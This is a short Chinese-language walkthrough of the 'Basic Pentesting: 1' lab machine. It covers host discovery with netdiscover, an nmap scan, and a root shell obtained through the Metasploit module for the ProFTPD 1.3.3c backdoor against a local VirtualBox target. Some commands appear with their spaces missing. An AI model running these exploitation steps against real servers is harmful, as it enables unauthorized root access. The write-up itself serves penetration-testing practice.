# Basic Pentesting: 1

目标：获取root权限 环境配置：virtualbox配置

## **信息收集**：

首先我们使用**netdiscover**去寻找主机IP，在环境配置时靶机被配置在**vboxnet0**下，进行如下搜索：`netdiscover-i vboxnet0`得到如下图结果：![](../Images/08ecd5c2bc77c547f008b899abe14e1e.png)我们得到了该主机的ip：**192.168.56.108**。下一步就是使用**nmap**对该IP进行信息搜集，这里我们使用的nmap的命令如下：`nmap-A-p-192.168.56.108`得到如下图结果：

![](../Images/ee4c31af96f26538f3e105dac38ee228.png)

**参数功能解释如下**：

  

*   \-p-：扫描全部端口
    
*   \-A：启用操作系统检测，版本检测，脚本扫描和路由跟踪
    

**扫描结果分析**：

目前开放了三个端口

*   端口 21/tcp - FTP - (ProFTPD 1.3.3c)
    
*   端口 22/tcp - SSH - (OpenSSH 7.2p2 Ubuntu)
    
*   端口 80/tcp - HTTP - (Apache httpd 2.4.18)
    

其中的ProFTPD 1.3.3c有一个后门，我们将使用msf对其进行攻击。

## **攻击**：

使用msf对其攻击的过程非常简单。首先，我们搜索关于ProFTPD的相关漏洞 `searchProFTPD`我们发现ProFTPD 1.3.3c相关组件，使用该组件 `useexploit/unix/ftp/proftpd_133c_backdoor`随后展示相关选项并填入空白部分 `show options` `setRHOST192.168.56.108`运行 `run`整个流程如下图所示：![](../Images/a627af023dc4100ac3fb2c92216425a3.png)在在弹出的shell里 确认一下身份即可 `whoami`如下图所示：

![](../Images/4230f826c9c3671d5617beadbb4466fe.png)

OK，成功获取root权限。
